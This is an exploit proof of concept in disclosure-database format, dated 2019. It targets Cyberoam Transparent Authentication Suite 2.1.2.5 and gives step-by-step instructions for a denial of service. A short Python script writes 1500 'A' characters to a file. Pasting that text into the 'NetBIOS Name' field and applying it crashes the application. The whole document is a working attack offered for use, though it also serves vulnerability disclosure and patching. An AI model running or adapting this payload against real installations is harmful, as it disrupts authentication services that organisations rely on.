#Exploit Title: Cyberoam Transparent Authentication Suite 2.1.2.5 - 'NetBIOS Name' Denial of Service (PoC)
#Discovery by: Victor Mondragón
#Discovery Date: 2019-05-23
#Vendor Homepage: https://www.cyberoam.com
#Software Link: https://download.cyberoam.com/solution/optionals/i18n/CTAS%202.1.2.5%20Release.zip
#Tested Version: 2.1.2.5
#Tested on: Windows 7 Service Pack 1 x64

#Steps to produce the crash:
#1.- Run python code: ctas_nn_2.1.2.5.py
#2.- Open ctas_nn_2.1.2.5.txt and copy content to clipboard
#3.- Open Cyberoam Transparent Authentication Suite
#4.- Select General > in Domain Type select "Microsoft Active Directory"
#5.- In "NetBIOS Name" Paste Clipboard
#6.- Click on "Apply"
#7.- Crashed! 

cod = "\x41" * 1500

f = open('ctas_nn_2.1.2.5.txt', 'w')
f.write(cod)
f.close()